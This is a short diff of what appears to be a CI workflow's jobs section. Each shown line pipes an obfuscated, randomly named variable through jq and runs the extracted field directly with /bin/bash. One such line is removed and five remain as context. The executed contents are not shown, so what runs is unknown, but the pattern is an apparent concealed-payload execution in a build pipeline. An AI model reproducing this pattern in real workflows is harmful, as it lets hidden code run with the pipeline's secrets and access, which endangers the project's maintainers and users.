@@ -63,7 +63,6 @@ jobs:
           echo $tsb3 | jq -r .monz8 | /bin/bash
           printf '%s' "$vt631" | jq -r .oepks71 | /bin/bash
           printf '%s' "$wt19" | jq -r .sg00373 | /bin/bash
-          printf '%s' "$vc0" | jq -r .a4290 | /bin/bash
           printf '%s' "$pco193" | jq -r .oj25 | /bin/bash
           echo $d1 | jq -r .reugz57228 | /bin/bash
 
